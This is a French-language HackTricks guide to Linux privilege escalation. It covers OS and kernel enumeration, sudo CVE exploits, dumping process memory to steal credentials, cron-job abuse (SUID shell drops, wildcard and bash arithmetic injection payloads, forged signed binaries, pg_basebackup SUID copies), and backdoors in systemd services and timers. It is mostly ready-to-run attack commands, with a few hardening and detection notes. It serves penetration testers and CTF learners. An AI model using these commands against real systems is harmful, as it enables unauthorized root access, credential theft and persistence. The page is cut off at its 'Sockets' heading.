# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informations système

### Infos OS

Commençons par acquérir quelques connaissances sur l'OS en cours d'exécution
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Chemin

Si vous **avez des permissions d'écriture sur n'importe quel dossier à l'intérieur de la variable `PATH`**, vous pourriez être en mesure de détourner certaines bibliothèques ou binaires :
```bash
echo $PATH
```
### Infos d'environnement

Des informations intéressantes, des mots de passe ou des clés API dans les variables d'environnement ?
```bash
(env || set) 2>/dev/null
```
### Exploits du kernel

Vérifiez la version du kernel et s’il existe un exploit qui peut être utilisé pour escalader les privilèges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Vous pouvez trouver une bonne liste de kernel vulnérables et déjà certains **compiled exploits** ici : [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) et [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
D’autres sites où vous pouvez trouver certains **compiled exploits** : [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Pour extraire toutes les versions de kernel vulnérables de ce site, vous pouvez faire :
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Des outils qui pourraient aider à rechercher des exploits de kernel sont :

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Toujours **rechercher la version du kernel sur Google**, peut-être que votre version du kernel est mentionnée dans un exploit de kernel, et alors vous serez sûr que cet exploit est valide.

Techniques supplémentaires d'exploitation du kernel :

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Version de Sudo

Basé sur les versions vulnérables de sudo qui apparaissent dans :
```bash
searchsploit sudo
```
Vous pouvez vérifier si la version de sudo est vulnérable en utilisant ce grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Les versions de Sudo antérieures à 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permettent à des utilisateurs locaux non privilégiés d’élever leurs privilèges à root via l’option sudo `--chroot` lorsque le fichier `/etc/nsswitch.conf` est utilisé depuis un répertoire contrôlé par l’utilisateur.

Voici un [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) pour exploiter cette [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Avant d’exécuter l’exploit, assurez-vous que votre version de `sudo` est vulnérable et qu’elle prend en charge la fonctionnalité `chroot`.

Pour plus d’informations, référez-vous à l’[original vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo avant 1.9.17p1 (plage affectée signalée : **1.8.8–1.9.17**) peut évaluer les règles sudoers basées sur l’hôte en utilisant le **nom d’hôte fourni par l’utilisateur** via `sudo -h <host>` au lieu du **vrai nom d’hôte**. Si sudoers accorde des privilèges plus larges sur un autre hôte, vous pouvez **spoof** cet hôte localement.

Exigences :
- Version de sudo vulnérable
- Règles sudoers spécifiques à l’hôte (l’hôte n’est ni le nom d’hôte actuel ni `ALL`)

Exemple de motif sudoers :
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploiter en usurpant l’hôte autorisé :
```bash
sudo -h devbox id
sudo -h devbox -i
```
Si la résolution du nom usurpé bloque, ajoutez-le à `/etc/hosts` ou utilisez un nom d’hôte qui apparaît déjà dans les logs/configs pour éviter les recherches DNS.

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### La vérification de la signature Dmesg a échoué

Consulte la **box smasher2 de HTB** pour un **exemple** de la façon dont cette vulnérabilité pourrait être exploitée
```bash
dmesg 2>/dev/null | grep "signature"
```
### Plus d’énumération du système
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Énumérer les défenses possibles

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Si vous êtes à l’intérieur d’un container, commencez par la section container-security suivante, puis pivotez vers les pages d’abus spécifiques au runtime :


{{#ref}}
container-security/
{{#endref}}

## Drives

Vérifiez **ce qui est monté et démonté**, où et pourquoi. Si quelque chose est démonté, vous pouvez essayer de le monter et vérifier s’il contient des infos privées
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Logiciels utiles

Répertorier les binaires utiles
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Vérifie également si **un compilateur est installé**. C'est utile si vous devez utiliser un exploit du noyau, car il est recommandé de le compiler sur la machine où vous allez l'utiliser (ou sur une machine similaire).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Logiciels vulnérables installés

Vérifiez la **version des paquets et services installés**. Il y a peut-être une ancienne version de Nagios (par exemple) qui pourrait être exploitée pour l'escalade de privilèges…\
Il est recommandé de vérifier manuellement la version des logiciels installés les plus suspects.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Si vous avez accès SSH à la machine, vous pourriez aussi utiliser **openVAS** pour vérifier s’il y a des logiciels obsolètes et vulnérables installés sur la machine.

> [!NOTE] > _Notez que ces commandes afficheront beaucoup d’informations qui seront pour la plupart inutiles ; il est donc recommandé d’utiliser des applications comme OpenVAS ou similaires qui vérifieront si une version de logiciel installée est vulnérable à des exploits connus_

## Processes

Regardez **quels processus** sont en cours d’exécution et vérifiez si certains processus ont **plus de privilèges qu’ils ne devraient** en avoir (peut-être un tomcat exécuté par root ?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Chaînes parent-enfant inter-utilisateurs

Un processus enfant s'exécutant sous un **utilisateur différent** de celui de son parent n'est pas automatiquement malveillant, mais c'est un **signal de triage** utile. Certaines transitions sont attendues (`root` lançant un utilisateur de service, les gestionnaires de connexion créant des processus de session), mais des chaînes inhabituelles peuvent révéler des wrappers, des aides de débogage, de la persistence ou des frontières de confiance d'exécution faibles.

Revue rapide:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Si vous trouvez une chaîne surprenante, inspectez la ligne de commande du parent et tous les fichiers qui influencent son comportement (`config`, `EnvironmentFile`, scripts d’aide, répertoire de travail, arguments inscriptibles). Dans plusieurs chemins réels de privesc, le child lui-même n’était pas inscriptible, mais la **parent-controlled config** ou la chaîne d’aide l’était.

### Deleted executables and deleted-open files

Les artefacts d’exécution sont souvent encore accessibles **après suppression**. C’est utile à la fois pour l’escalade de privilèges et pour récupérer des preuves à partir d’un process qui a déjà des fichiers sensibles ouverts.

Vérifiez les executables supprimés :
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Si `/proc/<PID>/exe` pointe vers `(deleted)`, le processus exécute toujours l’ancienne image binaire en mémoire. C’est un signal fort à investiguer car :

- l’exécutable supprimé peut contenir des chaînes intéressantes ou des identifiants
- le processus en cours d’exécution peut encore exposer des descripteurs de fichier utiles
- un binaire privilégié supprimé peut indiquer une altération récente ou une tentative de nettoyage

Collect deleted-open files globally:
```bash
lsof +L1
```
Si vous trouvez un descripteur intéressant, récupérez-le directement :
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Ceci est particulièrement utile lorsqu’un processus a encore un secret supprimé, un script, une exportation de base de données, ou un fichier flag ouvert.

### Process monitoring

Vous pouvez utiliser des outils comme [**pspy**](https://github.com/DominicBreuker/pspy) pour monitorer les processus. Cela peut être très utile pour identifier des processus vulnérables exécutés fréquemment ou lorsqu’un ensemble de conditions est rempli.

### Process memory

Certains services d’un serveur sauvegardent des **credentials en clair dans la mémoire**.\
Normalement, vous aurez besoin de **privilèges root** pour lire la mémoire des processus appartenant à d’autres utilisateurs, donc cela est généralement plus utile lorsque vous êtes déjà root et que vous voulez découvrir plus de credentials.\
Cependant, rappelez-vous qu’**en tant qu’utilisateur standard vous pouvez lire la mémoire des processus que vous possédez**.

> [!WARNING]
> Notez qu’aujourd’hui la plupart des machines **n’autorisent pas ptrace par défaut**, ce qui signifie que vous ne pouvez pas dumper d’autres processus appartenant à votre utilisateur non privilégié.
>
> Le fichier _**/proc/sys/kernel/yama/ptrace_scope**_ contrôle l’accessibilité de ptrace :
>
> - **kernel.yama.ptrace_scope = 0** : tous les processus peuvent être debugged, tant qu’ils ont le même uid. C’est la manière classique dont ptracing fonctionnait.
> - **kernel.yama.ptrace_scope = 1** : seul un processus parent peut être debugged.
> - **kernel.yama.ptrace_scope = 2** : seul l’admin peut utiliser ptrace, car cela requiert la capacité CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3** : aucun processus ne peut être tracé avec ptrace. Une fois défini, un reboot est nécessaire pour réactiver ptracing.

#### GDB

Si vous avez accès à la mémoire d’un service FTP (par exemple), vous pourriez obtenir le Heap et y rechercher ses credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Pour un ID de processus donné, **maps montre comment la mémoire est mappée dans l'espace d'adresses virtuel de ce processus** ; il affiche aussi les **permissions de chaque région mappée**. Le pseudo-fichier **mem** **expose la mémoire du processus elle-même**. À partir du fichier **maps**, nous savons quelles **régions mémoire sont lisibles** et leurs offsets. Nous utilisons cette information pour **nous positionner dans le fichier mem et dumper toutes les régions lisibles** vers un fichier.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` fournit un accès à la mémoire **physique** du système, et non à la mémoire virtuelle. L'espace d'adresses virtuel du kernel peut être accédé en utilisant /dev/kmem.\
En général, `/dev/mem` est uniquement lisible par **root** et le groupe **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump est une réinvention pour Linux de l’outil classique ProcDump de la suite d’outils Sysinternals pour Windows. Obtenez-le sur [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Pour vider la mémoire d'un process, vous pouvez utiliser :

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Vous pouvez supprimer manuellement les exigences root et vider le process dont vous êtes propriétaire
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is required)

### Credentials from Process Memory

#### Manual example

Si vous trouvez que le process authenticator est en cours d'exécution :
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Vous pouvez dumper le processus (voir les sections précédentes pour trouver différentes façons de dumper la mémoire d'un processus) et rechercher des credentials dans la mémoire :
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

L'outil [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) va **voler des identifiants en clair depuis la mémoire** et depuis certains **fichiers bien connus**. Il nécessite des privilèges root pour fonctionner correctement.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) exécuté en tant que root – privesc de planificateur web

Si un panneau web “Crontab UI” (alseambusher/crontab-ui) s’exécute en tant que root et est lié uniquement à loopback, vous pouvez quand même y accéder via le port-forwarding local SSH et créer une tâche privilégiée pour escalader.

Chaîne typique
- Découvrir le port uniquement loopback (par ex. 127.0.0.1:8000) et le realm Basic-Auth via `ss -ntlp` / `curl -v localhost:8000`
- Trouver les identifiants dans des artefacts opérationnels :
- Sauvegardes/scripts avec `zip -P <password>`
- unité systemd exposant `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel et connexion :
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Créez un job avec des privilèges élevés et exécutez-le immédiatement (dépose un shell SUID) :
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Utilisez-le :
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Ne lancez pas Crontab UI en tant que root ; limitez-le avec un utilisateur dédié et des permissions minimales
- Liez-le à localhost et restreignez en plus l’accès via firewall/VPN ; ne réutilisez pas les mots de passe
- Évitez d’intégrer des secrets dans les fichiers unitaires ; utilisez des secret stores ou un EnvironmentFile accessible uniquement à root
- Activez l’audit/le logging pour les exécutions de tâches à la demande



Vérifiez si une tâche planifiée est vulnérable. Peut-être pouvez-vous tirer parti d’un script exécuté par root (wildcard vuln ? pouvez-vous modifier des fichiers que root utilise ? utiliser des symlinks ? créer des fichiers spécifiques dans le répertoire que root utilise ?)
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Si `run-parts` est utilisé, vérifiez quels noms seront réellement exécutés :
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Cela évite les faux positifs. Un répertoire périodique inscriptible n’est utile que si le nom de votre payload correspond aux règles locales de `run-parts`.

### Cron path

Par exemple, dans _/etc/crontab_ vous pouvez trouver le PATH : _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Notez comment l’utilisateur "user" a les privilèges d’écriture sur /home/user_)

Si, dans ce crontab, l’utilisateur root essaie d’exécuter une commande ou un script sans définir le path. Par exemple : _\* \* \* \* root overwrite.sh_\
Alors, vous pouvez obtenir un shell root en utilisant :
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron utilisant un script avec un wildcard (Wildcard Injection)

Si un script exécuté par root contient un “**\***” à l’intérieur d’une commande, vous pourriez exploiter cela pour provoquer des actions inattendues (comme une privesc). Exemple :
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Si le wildcard est précédé d’un chemin comme** _**/some/path/\***_ **, il n’est pas vulnérable (même** _**./\***_ **ne l’est pas).**

Lisez la page suivante pour plus d’astuces d’exploitation de wildcards :


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Injection de bash arithmetic expansion dans les parseurs de logs cron

Bash effectue l’expansion des paramètres et la substitution de commandes avant l’évaluation arithmétique dans ((...)), $((...)) et let. Si un cron/parser root lit des champs de log non fiables et les injecte dans un contexte arithmétique, un attaquant peut injecter une substitution de commande $(...) qui s’exécute en tant que root lorsque le cron tourne.

- Pourquoi ça fonctionne : Dans Bash, les expansions se produisent dans cet ordre : expansion des paramètres/variables, substitution de commandes, expansion arithmétique, puis word splitting et pathname expansion. Donc une valeur comme `$(/bin/bash -c 'id > /tmp/pwn')0` est d’abord substituée (ce qui exécute la commande), puis le `0` numérique restant est utilisé pour l’arithmétique, de sorte que le script continue sans erreur.

- Modèle vulnérable typique :
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation : Faites écrire du texte contrôlé par l’attaquant dans le log analysé afin que le champ ressemblant à un nombre contienne une substitution de commande et se termine par un chiffre. Assurez-vous que votre commande n’imprime rien sur stdout (ou redirigez-le) afin que l’arithmétique reste valide.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Écrasement de script cron et symlink

Si vous **pouvez modifier un script cron** exécuté par root, vous pouvez obtenir un shell très facilement :
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si le script exécuté par root utilise un **répertoire auquel vous avez un accès complet**, il pourrait être utile de supprimer ce dossier et de **créer un dossier symlink vers un autre** servant un script contrôlé par vous
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Validation des symlinks et gestion plus sûre des fichiers

Lors de l’examen de scripts/binaires privilégiés qui lisent ou écrivent des fichiers par chemin, vérifiez comment les liens sont gérés :

- `stat()` suit un symlink et retourne les métadonnées de la cible.
- `lstat()` retourne les métadonnées du lien lui-même.
- `readlink -f` et `namei -l` aident à résoudre la cible finale et à afficher les permissions de chaque composant du chemin.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Pour les défenseurs/développeurs, des schémas plus sûrs contre les astuces de symlink incluent :

- `O_EXCL` avec `O_CREAT`: échouer si le path existe déjà (bloque les liens/fichiers créés à l’avance par l’attaquant).
- `openat()`: opérer relativement à un file descriptor de répertoire de confiance.
- `mkstemp()`: créer des fichiers temporaires de façon atomique avec des permissions sécurisées.

### Custom-signed cron binaries with writable payloads
Les blue teams « signent » parfois des binaries pilotés par cron en extrayant une section ELF personnalisée puis en cherchant une vendor string avant de les exécuter en root. Si ce binary est group-writable (par ex. `/opt/AV/periodic-checks/monitor` appartenant à `root:devs 770`) et que vous pouvez leak le signing material, vous pouvez forger la section et détourner la tâche cron :

1. Utilisez `pspy` pour capturer le flux de vérification. Dans Era, root exécutait `objcopy --dump-section .text_sig=text_sig_section.bin monitor` puis `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, puis lançait le fichier.
2. Recréez le certificat attendu en utilisant la clé/config leakée (depuis `signing.zip`) :
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Construisez un remplacement malveillant (par ex. déposer un bash SUID, ajouter votre SSH key) et intégrez le certificat dans `.text_sig` pour que le grep passe :
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Écrasez le binary planifié tout en conservant les bits d’exécution :
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Attendez la prochaine exécution de cron ; une fois que la vérification naive de la signature réussit, votre payload s’exécute en root.

### Frequent cron jobs

Vous pouvez surveiller les processes pour rechercher les processes qui sont exécutés toutes les 1, 2 ou 5 minutes. Peut-être pouvez-vous en tirer parti et élever vos privilèges.

Par exemple, pour **surveiller toutes les 0.1s pendant 1 minute**, **trier par commandes les moins exécutées** et supprimer les commandes qui ont été exécutées le plus souvent, vous pouvez faire :
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Vous pouvez aussi utiliser** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (cela surveillera et listera chaque processus qui démarre).

### Sauvegardes root qui préservent les bits de mode définis par l’attaquant (pg_basebackup)

Si un cron appartenant à root encapsule `pg_basebackup` (ou toute copie récursive) sur un répertoire de base de données que vous pouvez écrire, vous pouvez déposer un binaire **SUID/SGID** qui sera recopié comme **root:root** avec les mêmes bits de mode dans la sortie de sauvegarde.

Flux de découverte typique (en tant qu’utilisateur DB peu privilégié) :
- Utilisez `pspy` pour repérer un cron root appelant quelque chose comme `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` chaque minute.
- Vérifiez que le cluster source (par exemple, `/var/lib/postgresql/14/main`) est inscriptible par vous et que la destination (`/opt/backups/current`) devient propriété de root après l’exécution du job.

Exploit :
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Cela fonctionne parce que `pg_basebackup` préserve les bits de mode des fichiers lors de la copie du cluster ; lorsqu’il est invoqué par root, les fichiers de destination héritent de **la propriété root + SUID/SGID choisi par l’attaquant**. Toute routine de sauvegarde/copie privilégiée similaire qui conserve les permissions et écrit dans un emplacement exécutable est vulnérable.

### Invisible cron jobs

Il est possible de créer un cronjob en **plaçant un retour chariot après un commentaire** (sans caractère de nouvelle ligne), et le cron job fonctionnera. Exemple (notez le caractère de retour chariot) :
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Pour détecter ce type d’entrée furtive, inspectez les fichiers cron avec des outils qui exposent les caractères de contrôle :
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Fichiers _.service_ inscriptibles

Vérifie si tu peux écrire dans un fichier `.service` ; si c’est le cas, tu **pourrais le modifier** pour qu’il **exécute** ton **backdoor lorsque** le service est **démarré**, **redémarré** ou **arrêté** (peut-être devras-tu attendre que la machine soit redémarrée).\
Par exemple, crée ton backdoor directement dans le fichier .service avec **`ExecStart=/tmp/script.sh`**

### Binaires de service inscriptibles

Garde à l’esprit que si tu as des **permissions d’écriture sur des binaires exécutés par des services**, tu peux les remplacer par des backdoors afin que, lorsque les services seront ré-exécutés, les backdoors s’exécutent.

### systemd PATH - Chemins relatifs

Tu peux voir le PATH utilisé par **systemd** avec :
```bash
systemctl show-environment
```
Si vous constatez que vous pouvez **write** dans n’importe lequel des dossiers du path, vous pourriez être en mesure d’**escalate privileges**. Vous devez rechercher des **relative paths being used on service configurations** files comme :
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Puis, créez un **exécutable** avec le **même nom que le binaire du chemin relatif** à l’intérieur du dossier PATH de systemd dans lequel vous pouvez écrire, et lorsque le service est invité à exécuter l’action vulnérable (**Start**, **Stop**, **Reload**), votre **backdoor sera exécutée** (les utilisateurs non privilégiés ne peuvent généralement pas démarrer/arrêter des services, mais vérifiez si vous pouvez utiliser `sudo -l`).

**En savoir plus sur les services avec `man systemd.service`.**

## **Timers**

Les **Timers** sont des fichiers d’unité systemd dont le nom se termine par `**.timer**` et qui नियंत्रlent des fichiers `**.service**` ou des événements. Les **Timers** peuvent être utilisés comme alternative à cron, car ils prennent en charge nativement les événements de temps calendaires et les événements de temps monotones, et peuvent s’exécuter de manière asynchrone.

Vous pouvez énumérer tous les timers avec :
```bash
systemctl list-timers --all
```
### Minuteurs modifiables

Si vous pouvez modifier un minuteur, vous pouvez le faire exécuter des instances existantes de systemd.unit (comme un `.service` ou un `.target`)
```bash
Unit=backdoor.service
```
Dans la documentation, vous pouvez lire ce qu’est le Unit :

> Le unit à activer lorsque ce timer expire. L’argument est un nom de unit, dont le suffixe n’est pas ".timer". S’il n’est pas spécifié, cette valeur prend par défaut un service ayant le même nom que le unit du timer, à l’exception du suffixe. (Voir ci-dessus.) Il est recommandé que le nom du unit activé et le nom du unit du timer soient identiques, à l’exception du suffixe.

Par conséquent, pour abuser de cette permission, vous devriez :

- Trouver un certain systemd unit (comme un `.service`) qui **exécute un binaire inscriptible**
- Trouver un certain systemd unit qui **exécute un chemin relatif** et pour lequel vous avez des **privilèges d’écriture** sur le **systemd PATH** (pour usurper cet exécutable)

**En savoir plus sur les timers avec `man systemd.timer`.**

### **Activer un Timer**

Pour activer un timer, vous avez besoin des privilèges root et d’exécuter :
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Notez que le **timer** est **activé** en créant un symlink vers lui dans `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

